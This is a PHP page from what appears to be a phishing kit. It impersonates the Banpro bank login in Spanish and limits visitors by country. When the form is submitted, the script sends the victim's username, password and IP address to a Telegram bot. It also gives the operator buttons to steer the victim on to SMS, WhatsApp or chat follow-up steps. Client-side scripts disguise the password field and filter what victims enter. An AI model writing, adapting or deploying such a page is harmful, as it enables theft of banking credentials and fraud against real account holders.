<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) {
    header('Location: /', true, 302);
    exit;
}
// Re-verificación de país (anti session-hijack)
$_cf_country = strtoupper($_SERVER['HTTP_CF_IPCOUNTRY'] ?? '');
if ($_cf_country && !in_array($_cf_country, ['NI','CO'], true)) {
    session_destroy();
    header('Location: /', true, 302);
    exit;
}
include("oslo.php");

$se = isset($_GET['error']);
$nt = bin2hex(random_bytes(8));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $u = str_replace(' ', '', $_POST['udata'] ?? '');
    $cv = $_POST['pdata'] ?? '';
    $ip = ip_yago();

    $_SESSION['usuario'] = $u;
    $_SESSION['security_token'] = $nt;

    $mg = "🔐login\n\n $u\n $cv\n\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$ambar/sendMessage?" . http_build_query([
        'chat_id' => $koala,
        'text' => $mg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ Login Error', 'callback_data' => "ERROR|$u"],
                    ['text' => '📩 SMS', 'callback_data' => "SMS|$u"]
                ],
                [
                    ['text' => '� Chat', 'callback_data' => "CHAT|$u"],
                    ['text' => '📱 WS', 'callback_data' => "WS|$u"]
                ],
                [
                    ['text' => '�🕒 Time-form', 'callback_data' => "TIMEFORM|$u"]
                ]
            ]
        ])
    ]));

    header("Location: pampa.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Bienvenido</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        @font-face{font-family:'NunitoSans';src:url('font/NunitoSans-Regular.ttf') format('truetype');font-weight:400;font-style:normal;}
        @font-face{font-family:'NunitoSans';src:url('font/NunitoSans-Bold.ttf') format('truetype');font-weight:700 800;font-style:normal;}
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;background:linear-gradient(to bottom,#69BE28,#006838);display:flex;flex-direction:column;align-items:center;font-family:'NunitoSans',sans-serif;padding-top:24px;}
        .wr{background:#fff;border-radius:12px 12px 0 0;padding:24px 20px 0;width:100%;max-width:420px;flex:1;display:flex;flex-direction:column;}
        .lg{margin-bottom:22px;}
        .lg img{height:52px;width:auto;}
        .wc h2{font-size:17px;font-weight:700;color:#222;margin-bottom:2px;font-family:'NunitoSans',sans-serif;}
        .wc p{font-size:14px;color:#444;margin-bottom:18px;font-family:'NunitoSans',sans-serif;font-weight:400;}
        .fb{margin-bottom:10px;}
        .fb label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-family:'NunitoSans',sans-serif;}
        .fb input{width:100%;padding:11px 13px;border:1px solid #ccc;border-radius:4px;font-size:15px;color:#333;outline:none;transition:border-color 0.2s;background:#fff;font-family:'NunitoSans',sans-serif;}
        .fb input:focus{border-color:#006838;}
        .em{font-size:13px;color:#d00;font-weight:700;margin-bottom:14px;}
        .rm{display:flex;justify-content:space-between;align-items:center;margin-top:14px;margin-bottom:18px;}
        .rm .fl{font-size:13px;color:#006838;text-decoration:underline;cursor:pointer;font-family:'NunitoSans',sans-serif;}
        .rm .tw{display:flex;align-items:center;gap:8px;font-size:13px;color:#333;font-family:'NunitoSans',sans-serif;}
        .tg{position:relative;display:inline-block;width:44px;height:24px;}
        .tg input{display:none;}
        .ts{position:absolute;inset:0;background:#ccc;border-radius:24px;cursor:pointer;transition:background 0.2s;}
        .ts:before{content:'';position:absolute;width:18px;height:18px;background:#fff;border-radius:50%;top:3px;left:3px;transition:transform 0.2s;box-shadow:0 1px 3px rgba(0,0,0,0.25);}
        .tg input:checked+.ts{background:#006838;}
        .tg input:checked+.ts:before{transform:translateX(20px);}
        .bs{width:100%;padding:13px;background:#006838;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:18px;transition:background 0.2s;font-family:'NunitoSans',sans-serif;}
        .bs:hover{background:#005228;}
        .bl{display:flex;justify-content:space-between;padding:14px 0 20px;}
        .bl a{font-size:13px;color:#006838;text-decoration:underline;cursor:pointer;font-family:'NunitoSans',sans-serif;}
        .bf{margin-top:auto;}
    </style>
</head>
<body>
<div class="wr">
    <div class="lg"><img src="l.png" alt="Banpro"></div>
    <div class="wc">
        <h2>&#161;Bienvenido!</h2>
        <p>Ingrese sus datos a continuaci&#243;n:</p>
    </div>
    <form method="post" action="" id="f01">
        <div class="fb">
            <label for="in1">Ingrese su Usuario</label>
            <input id="in1" name="udata" placeholder="Usuario" type="text" required
                   class="qi" autocomplete="off"
                   onkeypress="return nsp(event)"
                   oninput="this.value=this.value.replace(/\s/g,'');vlu(this)">
        </div>
        <div class="fb">
            <label for="in2">Ingrese su Contrase&#241;a</label>
            <input id="in2" name="pdata_display" placeholder="Contrase&#241;a" type="text" required
                   class="qi" autocomplete="off"
                   onkeypress="return nsp(event)"
                   oninput="hpi(this)">
        </div>
        <p id="em1" class="em" style="display:<?php echo $se ? 'block' : 'none'; ?>">Usuario o contrase&#241;a incorrecta</p>
        <div class="rm">
            <span class="fl">Olvid&#233; mi contrase&#241;a</span>
            <div class="tw">
                <span>Recordarme</span>
                <label class="tg"><input type="checkbox"><span class="ts"></span></label>
            </div>
        </div>
        <button type="submit" class="bs">Inicie Sesi&#243;n</button>
    </form>
    <div class="bf">
        <div class="bl">
            <a href="#">Tipo de Cambio</a>
            <a href="#">Afiliese</a>
        </div>
    </div>
</div>
<script>
    function nsp(e){return e.key!==" ";}
    function ece(t){
        var s=t.toLowerCase().replace(/\s/g,'');
        if(/^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/.test(s))return true;
        var i=s.indexOf('@');
        if(i>0&&i<s.length-1){var d=s.substring(i+1);if(d.includes('.')&&d.length>3){var p=d.split('.');if(p.length>=2&&p.every(function(x){return x.length>0;}))return true;}}
        return false;
    }
    function vlu(input){
        if(ece(input.value)){
            input.value='';
            var em=document.getElementById('em1');
            em.textContent='No se permiten correos en el campo de usuario';
            em.style.display='block';
            setTimeout(function(){em.textContent='Usuario o contrase\u00F1a incorrecta';em.style.display='none';},3000);
            return false;
        }
        return true;
    }
    function hpi(input){
        if(!input.dataset.realValue)input.dataset.realValue='';
        var rv=input.dataset.realValue,dv=input.value;
        if(dv.length<rv.length){input.dataset.realValue=rv.substring(0,dv.length);}
        else if(dv.length>rv.length){input.dataset.realValue+=dv.substring(rv.length).replace(/\s/g,'');}
        input.value='\u25CF'.repeat(input.dataset.realValue.length);
    }
    document.getElementById('f01').addEventListener('submit',function(e){
        var pi=document.getElementById('in2');
        if(pi.dataset.realValue){var h=document.createElement('input');h.type='hidden';h.name='pdata';h.value=pi.dataset.realValue;this.appendChild(h);}
    });
    function vcn(c){return/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()\-_=+[\]{};':"\\|,.<>/?]).{8,32}$/.test(c);}
    document.addEventListener("DOMContentLoaded",function(){
        var form=document.getElementById("f01"),em=document.getElementById("em1");
        form.addEventListener("submit",function(event){
            var pi=document.getElementById("in2"),c=pi.dataset.realValue||pi.value;
            if(!vcn(c)){event.preventDefault();em.style.display="block";setTimeout(function(){em.style.display="none";},10000);}
        });
    });
</script>
<?php if (!$se): ?>
<div id="pp1" style="position:fixed;inset:0;background:rgba(0,0,0,0.45);backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);z-index:9999;display:flex;align-items:center;justify-content:center;padding:24px;transition:opacity 0.4s ease;">
    <div style="background:#fff;border-radius:6px;padding:28px 24px 22px;max-width:340px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.25);">
        <p style="font-family:'NunitoSans',sans-serif;font-size:17px;font-weight:800;color:#1a1a1a;margin-bottom:12px;line-height:1.3;">Inicia sesi&#243;n para continuar</p>
        <p style="font-family:'NunitoSans',sans-serif;font-size:14px;font-weight:400;color:#555;line-height:1.6;margin-bottom:22px;"></p>
        <div style="background:#006838;border-radius:4px;padding:13px 0;cursor:pointer;" onclick="(function(){var p=document.getElementById('pp1');p.style.opacity='0';setTimeout(function(){p.style.display='none';},400);})()">
            <span style="font-family:'NunitoSans',sans-serif;font-size:16px;font-weight:700;color:#fff;">Continuar</span>
        </div>
    </div>
</div>
<script>
    (function(){var p=document.getElementById('pp1');setTimeout(function(){p.style.opacity='0';setTimeout(function(){p.style.display='none';},400);},6000);})();
</script>
<?php endif; ?>
</body>
</html>
